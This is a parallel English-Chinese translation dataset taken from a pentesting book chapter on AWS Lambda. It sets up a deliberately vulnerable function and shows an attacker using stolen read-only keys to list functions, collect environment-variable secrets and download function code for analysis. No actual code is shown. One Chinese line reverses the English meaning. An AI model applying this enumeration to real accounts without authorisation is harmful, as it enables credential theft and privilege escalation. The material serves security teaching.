- en: Security and Pentesting of AWS Lambda
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: AWS Lambda的安全性和渗透测试
- en: AWS Lambda is an amazing service that offers serverless functions and applications
    to users. Basically, you create a Lambda function with some code that you want
    to execute, then you create some sort of trigger, and whenever that trigger is
    fired, your Lambda function will execute. Users are only charged for the time
    it takes a Lambda function to run, which is a maximum of 15 minutes (but that
    can be manually lowered on a per-function basis). Lambda offers a variety of programming
    languages to use for your functions, and it has even gone as far as allowing you
    to set up your own runtime to use languages that it doesn't directly support yet.
    One thing that we should make clear before diving into all of this is what serverless
    is. Although serverless makes it sound like there are no servers involved, Lambda
    is basically just spinning up an isolated server for the duration that a function
    needs to run. So, there are still servers involved, but provisioning, hardening,
    and so on are all taken out of your hands as the user.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: AWS Lambda是一个令人惊叹的服务，为用户提供无服务器函数和应用程序。基本上，您创建一个带有要执行的代码的Lambda函数，然后创建某种触发器，每当触发该触发器时，您的Lambda函数将执行。用户只需支付Lambda函数运行所需的时间，最长为15分钟（但可以根据每个函数的需要手动降低）。Lambda提供了多种编程语言供您的函数使用，甚至允许您设置自己的运行时以使用它尚不直接支持的语言。在我们深入研究所有这些之前，我们应该澄清无服务器是什么。尽管无服务器听起来好像没有涉及服务器，但Lambda基本上只是为函数需要运行的持续时间启动一个隔离的服务器。因此，仍然涉及服务器，但作为用户，您不需要处理服务器的规划、加固等。
- en: What that means for attackers is that we can still execute code, work with the
    filesystem, and perform most of the other activities that you can perform on a
    regular server, but there are a few caveats. One is that the entire filesystem
    is mounted as read-only, which means you can't modify anything on the system directly,
    except in the `/tmp` directory. The `/tmp` directory is provided for a temporary
    location that files can be written to as needed during the execution of a Lambda
    function. Another is that there is no way you are getting root on these servers.
    Plain and simple, you just need to accept that you will forever be a low-level
    user in Lambda functions. If you do somehow find a way to escalate to the root
    user, I'm sure the people on the AWS security team will love to hear about it.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 对攻击者来说，这意味着我们仍然可以执行代码，使用文件系统，并执行大多数您可以在常规服务器上执行的其他活动，但有一些注意事项。其中之一是整个文件系统被挂载为只读，这意味着您无法直接修改系统上的任何内容，除了`/tmp`目录。`/tmp`目录是提供给Lambda函数在执行过程中根据需要写入文件的临时位置。另一个是您无法在这些服务器上获得root权限。简单明了，您只需接受您将永远成为Lambda函数中的低级用户。如果您确实找到了提升为root用户的方法，我相信AWS安全团队的人会很乐意听到这个消息。
- en: An example scenario of when you might use Lambda in the real world would be
    virus scanning any file that is uploaded to a specific S3 bucket in the account.
    Each time a file was uploaded to that bucket, the Lambda function would be triggered,
    and it would be passed the details of the upload event. Then, the function might
    download that file to the `/tmp` directory, and then use something like ClamAV
    ([https://www.clamav.net/](https://www.clamav.net/)) to run a virus scan on it.
    If the scan passed, the execution would complete. If the scan flaged the file
    as a virus, it might then delete the corresponding object in S3.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 在现实世界中，您可能会使用Lambda的一个示例场景是对上传到特定S3存储桶的任何文件进行病毒扫描。每次上传文件到该存储桶时，Lambda函数将被触发，并传递上传事件的详细信息。然后，函数可能会将该文件下载到`/tmp`目录，然后使用ClamAV（[https://www.clamav.net/](https://www.clamav.net/)）之类的工具对其进行病毒扫描。如果扫描通过，执行将完成。如果扫描标记文件为病毒，它可能会删除S3中相应的对象。
- en: 'In this chapter, we will cover the following topics:'
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将涵盖以下主题：
- en: Setting up a vulnerable Lambda function
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 设置一个易受攻击的Lambda函数
- en: Attacking Lambda functions with read access
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用读取访问攻击Lambda函数
- en: Attacking Lamda functions with read-write access
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用读写访问攻击Lamda函数
- en: Pivoting into virtual private clouds
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 转向虚拟私有云
- en: Setting up a vulnerable Lambda function
  id: totrans-9
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 设置一个易受攻击的Lambda函数
- en: The previous example of a Lambda function that's used to virus scan files in
    S3 is a similar but more complex version of what we are going to set up in our
    own environment. Our function will get triggered when a file is uploaded to an
    S3 bucket that we specify, where it will then download that file, inspect the
    contents, and then place tags on the object in S3, depending on what it finds.
    This function will have a few programming mistakes that open it up to exploitation
    for the sake of our demo, so don't go running this in your production account!
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: S3中用于病毒扫描文件的Lambda函数的先前示例与我们将在自己的环境中设置的类似，但更复杂。我们指定的S3存储桶上传文件时，我们的函数将被触发，然后下载该文件，检查内容，然后根据发现的内容在S3对象上放置标签。这个函数将有一些编程错误，使其容易受到利用，以便进行演示，所以不要在生产账户中运行这个函数！
- en: 'Before we get started on creating the Lambda function, let''s first set up
    the S3 buckets that will trigger our function and the IAM role that our function
    will assume. Navigate to the S3 dashboard (click on the Services drop-down menu
    and search for S3) and click on the Create bucket button:'
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们开始创建Lambda函数之前，让我们首先设置将触发我们函数的S3存储桶和我们函数将承担的IAM角色。导航到S3仪表板（单击服务下拉菜单并搜索S3），然后单击“创建存储桶”按钮：
- en: '![](img/b9113130-2785-4746-a8a8-999b47ef9ea9.png)'
  id: totrans-12
  prefs: []
  type: TYPE_IMG
  zh: '![](img/b9113130-2785-4746-a8a8-999b47ef9ea9.png)'
- en: The Create bucket button on the S3 dashboard
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: S3仪表板上的“创建存储桶”按钮
- en: 'Now, give your bucket a unique name; we will be using bucket-for-lambda-pentesting,
    but you''ll likely need to choose something else. For the region, we are selecting
    US West (Oregon), which is also known as `us-west-2`. Then, click on Next, then
    Next again, and then Next again. Leave everything on those pages as the default.
    Now, you should be presented with a summary of your S3 bucket. Click on Create
    bucket to create it:'
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，给您的存储桶一个唯一的名称；我们将使用bucket-for-lambda-pentesting，但您可能需要选择其他内容。对于地区，我们选择美国西部（俄勒冈州），也称为us-west-2。然后，单击“下一步”，然后再次单击“下一步”，然后再次单击“下一步”。将这些页面上的所有内容保留为默认设置。现在，您应该看到您的S3存储桶的摘要。单击“创建存储桶”以创建它：
- en: '![](img/23b01b13-0858-49ba-92a4-eadfe7664eb8.png)'
  id: totrans-15
  prefs: []
  type: TYPE_IMG
  zh: ！[](img/23b01b13-0858-49ba-92a4-eadfe7664eb8.png)
- en: The final button to click to create your S3 bucket
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 单击的最终按钮以创建您的S3存储桶
- en: Now, click on the bucket name when it shows up in your list of buckets, and
    that will complete the setup of the S3 bucket for our Lambda function (for now).
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，在您的存储桶列表中显示存储桶名称时，单击该名称，这将完成我们的Lambda函数的S3存储桶设置（暂时）。
- en: 'Leave that tab open in your browser, and in another tab, open the IAM dashboard
    (Services | IAM). Click on Roles in the list on the left side of the screen, and
    then click on the Create role button in the top left. Under Select type of trusted
    entity, choose AWS service, which should be the default. Then, under Choose the
    service that will use this role, choose Lambda**,** and then click on Next: Permissions:'
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 在浏览器中保留该选项卡打开，并在另一个选项卡中打开IAM仪表板（服务| IAM）。在屏幕左侧的列表中单击“角色”，然后单击左上角的“创建角色”按钮。在选择受信任实体类型下，选择AWS服务，这应该是默认值。然后，在“选择将使用此角色的服务”下，选择Lambda，然后单击“下一步：权限”：
- en: '![](img/e605c290-0a64-4bf5-a8fb-8b333713d7b1.png)'
  id: totrans-19
  prefs: []
  type: TYPE_IMG
  zh: ！[](img/e605c290-0a64-4bf5-a8fb-8b333713d7b1.png)
- en: Creating a new role for our Lambda function to assume
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 为我们的Lambda函数创建一个新角色
- en: On this page, search for the AWS managed policy, `AWSLambdaBasicExecutionRole`,
    and click on the checkbox next to it. This policy will allow our Lambda function
    to push execution logs to CloudWatch, and it is, in a sense, the minimum set of
    permissions that a Lambda function should be provided. It is possible to revoke
    these permissions, but then the Lambda function will keep trying to write logs,
    and it will keep getting access denied responses, which would be noisy to someone
    watching.
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 在此页面上，搜索AWS托管策略“AWSLambdaBasicExecutionRole”，并单击其旁边的复选框。此策略将允许我们的Lambda函数将执行日志推送到CloudWatch，并且从某种意义上说，这是Lambda函数应该提供的最低权限集。可以撤销这些权限，但是Lambda函数将继续尝试写日志，并且将继续收到访问被拒绝的响应，这对于观察的人来说会很嘈杂。
- en: Now, search for the AWS managed policy, `AmazonS3FullAccess` , and click on
    the checkbox next to it. This will provide our Lambda function with the ability
    to interact with the S3 service. Note that this policy is far too permissive for
    our Lambda function use case, because it allows for full S3 access to any S3 resource,
    when technically we will only need a few S3 permissions on our single bucket-for-lambda-pentesting
    S3 bucket. Often, you will find over-privileged resources in an AWS account that
    you are attacking, which does nothing more than benefit you as an attacker, so
    that will be a part of our demo scenario here.
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，搜索AWS托管策略“AmazonS3FullAccess”，并单击其旁边的复选框。这将使我们的Lambda函数能够与S3服务进行交互。请注意，对于我们的Lambda函数用例来说，此策略过于宽松，因为它允许对任何S3资源进行完全的S3访问，而从技术上讲，我们只需要对我们的单个bucket-for-lambda-pentesting
    S3存储桶进行少量的S3权限。通常，您会发现在攻击的AWS帐户中存在过度授权的资源，这对于您作为攻击者来说没有任何好处，因此这将成为我们演示场景的一部分。
- en: 'Now, click on the Next: Tags button on the bottom right of the screen. We don''t
    need to add any tags to this role, as those are typically used for other reasons
    than what we need to worry about right now, so just click on Next: Review now.
    Now, create a name for your role; we will be naming it `LambdaRoleForVulnerableFunction`
    for this demo, and we will be leaving the role description as the default, but
    you can write your own description in there if you would like. Now, finish this
    part off by clicking on Create role on the bottom right of the screen. If everything
    went smoothly, you should see a success message at the top of the screen:'
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，单击屏幕右下角的“下一步：标记”按钮。我们不需要向此角色添加任何标记，因为这些通常用于我们现在需要担心的其他原因，所以只需单击“下一步：立即审阅”。现在，为您的角色创建一个名称；对于此演示，我们将其命名为“LambdaRoleForVulnerableFunction”，并且我们将保留角色描述为默认值，但如果您愿意，可以在其中编写自己的描述。现在，通过单击屏幕右下角的“创建角色”来完成此部分。如果一切顺利，您应该会在屏幕顶部看到成功消息：
- en: '![](img/43a084b8-68c6-4fd8-ab95-65f27053d85d.png)'
  id: totrans-24
  prefs: []
  type: TYPE_IMG
  zh: ！[](img/43a084b8-68c6-4fd8-ab95-65f27053d85d.png)
- en: Our IAM role was successfully created
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的IAM角色已成功创建
- en: Finally, we can start to create the actual vulnerable Lambda function. To do
    so, navigate to the Lambda dashboard (Services | Lambda), and then click on Create
    a function, which should appear on the welcome page (because presumably, you don't
    have any functions created already). Note that this is still in the US West (Oregon)/`us-west-2`
    region, just like our S3 bucket.
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，我们可以开始创建实际的易受攻击的Lambda函数。要这样做，请转到Lambda仪表板（服务| Lambda），然后单击“创建函数”，这应该出现在欢迎页面上（因为可能您还没有创建任何函数）。请注意，这仍然位于美国西部（俄勒冈州）/
    us-west-2地区，就像我们的S3存储桶一样。
- en: Then, select Author from scratch at the top. Now, give your function a name.
    We will be naming it `VulnerableFunction` for this demo. Next, we need to select
    our runtime, which can be a variety of different programming languages. For this
    demo, we will choose Python 3.7 as our runtime.
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，在顶部选择从头开始。现在，为您的函数命名。对于此演示，我们将其命名为“VulnerableFunction”。接下来，我们需要选择我们的运行时，可以是各种不同的编程语言。对于此演示，我们将选择Python
    3.7作为我们的运行时。
- en: 'For the Role option, select Choose an existing role, and then under the Existing
    role option, select the role that we just created (LambdaRoleForVulnerableFunction).
    To finish it off, click on Create function in the bottom right:'
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 对于角色选项，请选择选择现有角色，然后在现有角色选项下，选择我们刚刚创建的角色（LambdaRoleForVulnerableFunction）。最后，单击右下角的“创建函数”：
- en: '![](img/8694b8c0-c1eb-4cbd-9196-047d9f9cee33.png)'
  id: totrans-29
  prefs: []
  type: TYPE_IMG
  zh: ！[](img/8694b8c0-c1eb-4cbd-9196-047d9f9cee33.png)
- en: All the options set for our new vulnerable Lambda function
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 我们新的易受攻击的Lambda函数设置的所有选项
- en: You should now drop into the dashboard for the new vulnerable function, which
    lets you view and configure various settings for the Lambda function.
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，您应该进入新易受攻击函数的仪表板，该仪表板可让您查看和配置Lambda函数的各种设置。
- en: 'We can ignore most of the stuff on this page for the time being, but if you''d
    like to learn more about Lambda itself, I suggest reading the AWS user guide for
    it at: [https://docs.aws.amazon.com/lambda/latest/dg/welcome.html](https://docs.aws.amazon.com/lambda/latest/dg/welcome.html).
    For now, scroll down to the Function code section. We can see that the value under
    Handler is `lambda_function.lambda_handler`. This means that when the function
    is invoked, the function named `lambda_handler` in the `lambda_function.py` file
    will be executed as the entry point for the Lambda function. The `lambda_function.py`
    file should already be open, but if it''s not, double-click on it in the file
    list to the left of the Function code section:'
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 目前，我们可以暂时忽略此页面上的大部分内容，但是如果您想了解有关Lambda本身的更多信息，我建议您阅读AWS用户指南：[https://docs.aws.amazon.com/lambda/latest/dg/welcome.html](https://docs.aws.amazon.com/lambda/latest/dg/welcome.html)。现在，向下滚动到“函数代码”部分。我们可以看到“处理程序”下的值是`lambda_function.lambda_handler`。这意味着当函数被调用时，`lambda_function.py`文件中名为`lambda_handler`的函数将作为Lambda函数的入口点执行。`lambda_function.py`文件应该已经打开，但如果没有，请在“函数代码”部分左侧的文件列表中双击它：
- en: '![](img/922ccc81-4968-4ff3-b55b-6ab9768b7bff.png)'
  id: totrans-33
  prefs: []
  type: TYPE_IMG
  zh: '![](img/922ccc81-4968-4ff3-b55b-6ab9768b7bff.png)'
- en: The Lambda function handler and what those values are referencing
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: Lambda函数处理程序及其引用的值
- en: If you chose a different programming language for the runtime of your function,
    you may encounter a slightly different format, but in general, they should be
    similar.
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您选择了不同的编程语言作为函数的运行时，您可能会遇到略有不同的格式，但总体上它们应该是相似的。
- en: 'Now that we have the Lambda function, the IAM role for the Lambda function,
    and our S3 bucket created, we are going to create the event trigger on our S3
    bucket that will then invoke our Lambda function every time it goes off. To do
    this, go back to the browser tab where your bucket-for-lambda-pentesting S3 bucket
    is and click on the Properties tab, and then scroll down to the options under
    Advanced settings and click on the Events button:'
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经有了Lambda函数、Lambda函数的IAM角色和我们创建的S3存储桶，我们将在我们的S3存储桶上创建事件触发器，每次触发时都会调用我们的Lambda函数。要做到这一点，返回到您的bucket-for-lambda-pentesting
    S3存储桶所在的浏览器选项卡，单击“属性”选项卡，然后向下滚动到“高级设置”下的选项，单击“事件”按钮：
- en: '![](img/79acebbb-ca45-4849-a784-d4bc0a804b90.png)'
  id: totrans-37
  prefs: []
  type: TYPE_IMG
  zh: '![](img/79acebbb-ca45-4849-a784-d4bc0a804b90.png)'
- en: Accessing the Events setting of our S3 bucket
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 访问我们S3存储桶的事件设置
- en: 'Next, click on Add notification and name this notification `LambdaTriggerOnS3Upload`.
    Under the Events section, check the box next to All object create events**,**
    which will suffice for our needs. We''ll want to leave the Prefix and Suffix blank
    for this notification. Click on the Send to drop-down menu and select Lambda Function,
    which should show another drop-down menu where you can select the function we
    created, `VulnerableFunction`. To wrap it all up, click on Save:'
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，单击“添加通知”，并将此通知命名为`LambdaTriggerOnS3Upload`。在“事件”部分下，选中“所有对象创建事件”旁边的复选框，这对我们的需求已经足够了。对于此通知，我们将希望将“前缀”和“后缀”留空。单击“发送到”下拉菜单，并选择“Lambda函数”，然后应该显示另一个下拉菜单，您可以在其中选择我们创建的函数`VulnerableFunction`。最后，单击“保存”：
- en: '![](img/21d55ec4-ab79-43b6-9599-92d21a346d6b.png)'
  id: totrans-40
  prefs: []
  type: TYPE_IMG
  zh: '![](img/21d55ec4-ab79-43b6-9599-92d21a346d6b.png)'
- en: The configuration we want for our new notification
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 我们想要的新通知配置
- en: 'After you have clicked on Save, the **Events** button should show 1 Active
    notifications:'
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 单击“保存”后，**事件**按钮应显示1个活动通知：
- en: '![](img/03ddc31b-ac53-4e0e-af6f-65e75a248fe4.png)'
  id: totrans-43
  prefs: []
  type: TYPE_IMG
  zh: '![](img/03ddc31b-ac53-4e0e-af6f-65e75a248fe4.png)'
- en: The notification that we just set up.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 我们刚刚设置的通知。
- en: 'If you switch back to the Lambda function dashboard and refresh the page, you
    should see that S3 has been added as a trigger to our Lambda function on the left-hand
    side of the Designer section:'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您返回到Lambda函数仪表板并刷新页面，您应该看到S3已被添加为左侧“设计”部分中我们Lambda函数的触发器：
- en: '![](img/13b360a6-5717-4302-b326-75bb3cd3e3c6.png)'
  id: totrans-46
  prefs: []
  type: TYPE_IMG
  zh: '![](img/13b360a6-5717-4302-b326-75bb3cd3e3c6.png)'
- en: The Lambda function is aware that it will be triggered by the notification we
    just set up
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: Lambda函数知道它将被我们刚刚设置的通知触发
- en: Basically, what we have just done is told our S3 bucket that every time an object
    is created (`/uploaded/` , and so on), it should invoke our Lambda function. S3
    will automatically invoke the Lambda function and pass in details related to the
    file uploaded through the `event` parameter, which is one of two that our function
    accepts (`event` and `context`). The Lambda function can read this data by looking
    at the contents of `event` during its execution.
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 基本上，我们刚刚告诉我们的S3存储桶，每当创建一个对象（`/uploaded/`等），它都应该调用我们的Lambda函数。S3将自动调用Lambda函数，并通过`event`参数传递与通过`event`参数传递的上传文件相关的详细信息，这是我们的函数接受的两个参数之一（`event`和`context`）。Lambda函数可以通过在执行过程中查看`event`的内容来读取这些数据。
- en: 'To finish off the setup of our vulnerable Lambda function, we need to add some
    vulnerable code to it! On the Lambda function dashboard, under Function code,
    replace the default code with the following:'
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 要完成我们易受攻击的Lambda函数的设置，我们需要向其中添加一些易受攻击的代码！在Lambda函数仪表板上，在“函数代码”下，用以下代码替换默认代码：
- en: '[PRE0]'
  id: totrans-50
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: As we continue through this chapter, we will take a deeper look at what is going
    on in this function. In simple terms, this function gets triggered whenever a
    file is uploaded to our S3 bucket; it will confirm that the file has a `.zip`
    extension, and then it will download that file to the `/tmp` directory. Once it
    is downloaded, it will use the `zipinfo`, `grep`, and `wc` programs to count how
    many files are stored in the ZIP file. It will then add a tag to the object in
    S3 that specifies how many files are in that ZIP file. You may or may not already
    be able to see where some things could go wrong, but we will get to that later.
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们继续阅读本章时，我们将更深入地了解这个函数的运行情况。简单来说，每当文件上传到我们的S3存储桶时，这个函数就会被触发；它将确认文件是否具有`.zip`扩展名，然后将文件下载到`/tmp`目录中。下载完成后，它将使用`zipinfo`、`grep`和`wc`程序来计算ZIP文件中存储了多少文件。然后它将向S3中的对象添加一个标签，指定该ZIP文件中有多少个文件。你可能已经能够看到一些问题可能出现的地方，但我们稍后会讨论这些问题。
- en: 'One last thing that we will do is drop-down to the Environment variables section
    of the Lambda dashboard and add an environment variable with the key `app_secret`
    and the value `1234567890`:'
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 我们要做的最后一件事是下拉到Lambda仪表板的环境变量部分，并添加一个带有键`app_secret`和值`1234567890`的环境变量：
- en: '![](img/aed37b17-a967-4953-b477-aa5c0c6db456.png)'
  id: totrans-53
  prefs: []
  type: TYPE_IMG
  zh: '![](img/aed37b17-a967-4953-b477-aa5c0c6db456.png)'
- en: Adding the app_secret environment variable to our function.
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 将app_secret环境变量添加到我们的函数中。
- en: To finish off this section, just click on the big orange Save button in the
    top right of the screen to save this code to your Lambda function, and we will
    be ready to move on.
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 要完成本节，只需点击屏幕右上角的大橙色保存按钮，将此代码保存到您的Lambda函数中，我们就可以继续了。
- en: Attacking Lambda functions with read access
  id: totrans-56
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用只读访问攻击Lambda函数
- en: To start the read access only section of this chapter, we will be creating a
    new IAM user with a specific set of permissions. This is the user that we will
    use to demo our attack, so we can assume that we just compromised this user's
    keys, through one method or another. These permissions will allow read-only access
    to AWS Lambda and object-upload access to S3, but nothing beyond that. We aren't
    going to walk through the whole process of creating a user, setting up their permissions,
    and adding their keys to the AWS CLI, because we covered that in previous chapters.
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 要开始本章的只读访问部分，我们将创建一个具有特定权限集的新IAM用户。这是我们将用来演示攻击的用户，因此我们可以假设我们以某种方式刚刚窃取了这个用户的密钥。这些权限将允许对AWS
    Lambda进行只读访问，并允许向S3上传对象，但不会超出此范围。我们不会详细介绍创建用户、设置其权限并将其密钥添加到AWS CLI的整个过程，因为我们在之前的章节中已经涵盖了这些内容。
- en: 'So, go ahead and create a new IAM user with programmatic access to AWS. For
    this demo, we will be naming that user `LambdaReadOnlyTester`. Next, we will add
    a custom inline IAM policy, using the following JSON document:'
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: 因此，请继续创建一个具有对AWS的编程访问权限的新IAM用户。对于这个演示，我们将命名该用户为`LambdaReadOnlyTester`。接下来，我们将添加一个自定义的内联IAM策略，使用以下JSON文档：
- en: '[PRE1]'
  id: totrans-59
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: As you can see, we can use any Lambda API that begins with `List` or `Get`,
    and we can use the S3 `PutObject` API. This is like what I have seen in a lot
    of AWS environments, where a user has broad read access to a variety of resources,
    and then some additional S3 permissions, such as the ability to upload files.
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 正如你所看到的，我们可以使用任何以`List`或`Get`开头的Lambda API，以及使用S3的`PutObject` API。这就像我在许多AWS环境中看到的情况，用户对各种资源具有广泛的读取权限，然后还有一些额外的S3权限，比如上传文件的能力。
- en: 'The first thing to do when looking at AWS Lambda as an attacker is to fetch
    all the relevant data for each Lambda function in the account. This can be done
    with the Lambda `ListFunctions` API. For this demo, we already know that the function
    we want to attack is in `us-west-2`, but in a real scenario, you''d likely want
    to check every region for Lambda functions that might be interesting. We''ll start
    off by running this AWS CLI command:'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 在作为攻击者查看AWS Lambda时，首先要做的是获取账户中每个Lambda函数的所有相关数据。这可以通过Lambda的`ListFunctions`
    API来完成。对于这个演示，我们已经知道我们想要攻击的函数在`us-west-2`，但在实际情况下，你可能想要检查每个区域是否有可能感兴趣的Lambda函数。我们将首先运行以下AWS
    CLI命令：
- en: '[PRE2]'
  id: totrans-62
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: 'We should get back some good info. The first thing to look for are environment
    variables. We set this vulnerable function up ourselves, so the environment variables
    are not big secrets to us, but as an attacker without that prior knowledge, you
    can often discover sensitive information being stored in the environment variables
    of a function. This information is returned to us in the `ListFunctions` call
    that we just made under the `"Environment"` key, where it should look something
    like this for our vulnerable function:'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 我们应该得到一些有用的信息。首先要查找的是环境变量。我们自己设置了这个有漏洞的函数，所以环境变量对我们来说并不是什么秘密，但作为攻击者，你经常可以发现存储在函数的环境变量中的敏感信息。这些信息在我们刚刚进行的`ListFunctions`调用中以`"Environment"`键的形式返回给我们，对于我们的有漏洞的函数，它应该看起来像这样：
- en: '[PRE3]'
  id: totrans-64
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: You can count on finding all sorts of unexpected things in the environment variables
    of Lambda functions. As an attacker, the value of `"app_secret"` sounds interesting.
    During penetration tests in the past, I have found all kinds of secrets in environment
    variables, including usernames/passwords/API keys to third-party services, AWS
    API keys to completely different accounts, and plenty more. Just looking at the
    environment variables of a few Lambda functions has allowed me to escalate my
    own privileges multiple times, so it is important to pay attention to what is
    being stored. We set this vulnerable function up ourselves, so we know that there
    is nothing we can do with the `"app_secret"` environment variable, but it was
    included to demonstrate the idea.
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以指望在Lambda函数的环境变量中发现各种意想不到的东西。作为攻击者，`"app_secret"`的值听起来很有趣。在过去的渗透测试中，我在环境变量中发现了各种秘密，包括用户名/密码/第三方服务的API密钥，AWS
    API密钥到完全不同的账户，以及更多。仅仅查看几个Lambda函数的环境变量就让我多次提升了自己的权限，因此重要的是要注意存储的内容。我们自己设置了这个有漏洞的函数，所以我们知道`"app_secret"`环境变量对我们来说没有什么用，但它被包含在其中是为了演示这个想法。
- en: When running the Lambda `ListFunctions` API call, the `"Environment"` key will
    only be included if the function has environment variables set; otherwise, it
    won't show up in the results, so don't be worried if nothing is available there.
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 在运行Lambda `ListFunctions` API调用时，如果函数设置了环境变量，`"Environment"`键将只包括在结果中；否则，它不会显示在结果中，所以如果那里没有任何内容可用，不要担心。
- en: 'After checking out the environment variables, it would be a good time to look
    at the code for each Lambda function. To do so from the AWS CLI, we can use the
    list of functions that we got back from `ListFunctions` and run each one through
    the Lambda `GetFunction` API call. For our vulnerable function, we can run the
    following command:'
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 在检查环境变量之后，现在是查看每个Lambda函数的代码的好时机。要从AWS CLI中执行此操作，我们可以使用从`ListFunctions`获得的函数列表，并将每个函数通过Lambda
    `GetFunction` API调用运行。对于我们的易受攻击函数，我们可以运行以下命令：
- en: '[PRE4]'
  id: totrans-68
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: The output will look like what is returned for each function when running `ListFunctions`,
    but there is one important distinction, which is the addition of the `Code` key.
    This key will include `RepositoryType` and `Location` keys, which is how we will
    download the code to this function. All we need to do is copy the URL under Code
    | Location and paste it into our web browser. The URL provided is a pre-signed
    URL that gives us access to the S3 bucket where the Lambda code is being stored.
    Once the page is visited, it should download a `.zip` file beginning with `VulnerableFunction`.
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 输出将看起来像运行`ListFunctions`时为每个函数返回的内容，但有一个重要的区别，即添加了`Code`键。这个键将包括`RepositoryType`和`Location`键，这是我们将代码下载到这个函数的方式。我们只需要复制Code
    | Location下的URL并粘贴到我们的网络浏览器中。提供的URL是一个预签名的URL，它给了我们访问存储Lambda代码的S3存储桶的权限。访问页面后，它应该会下载一个以`VulnerableFunction`开头的`.zip`文件。
- en: If you unzip the file, you will see a single file, `lambda_function.py`, which
    is where the code of the Lambda function is stored. In many cases, there will
    be multiple files in there, such as third-party libraries, configuration files,
    or binaries.
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您解压文件，您会看到一个名为`lambda_function.py`的单个文件，其中存储了Lambda函数的代码。在许多情况下，那里会有多个文件，如第三方库、配置文件或二进制文件。
- en: Although our vulnerable function is relatively short, we are going to approach
    it as if it is a large amount of code that we can't just quickly analyze manually
    to simulate a real situation, because you may not be familiar with the programming
    language that the Lambda function is using.
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 尽管我们的易受攻击函数相对较短，但我们将以它是大量代码的方式来处理，因为我们不能仅仅手动快速分析来模拟真实情况，因为您可能不熟悉Lambda函数使用的编程语言。
- en: With the function unzipped to our computer, we will now begin static analysis
    of the included code. We know that this function is running Python 3.7 because
    that is what was listed under `Runtime` when we ran `ListFunctions` and `GetFunction`, and
    because the main file is a `.py` file. There are many options for static analysis
    on code, free and paid, and they are different between programming languages,
    but we are going to be using `Bandit`, which is described as a tool designed to
    find common security issues in Python code. Before moving forward, note that just
    because we are using it here, it does not necessarily mean that it is the best
    and/or that it is perfect. I always suggest doing your own research and trying
    out different tools to find one that you like, but Bandit is one that I personally
    like to work with. Bandit is hosted on GitHub at [https://github.com/PyCQA/bandit](https://github.com/PyCQA/bandit)[.](https://github.com/PyCQA/bandit)
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
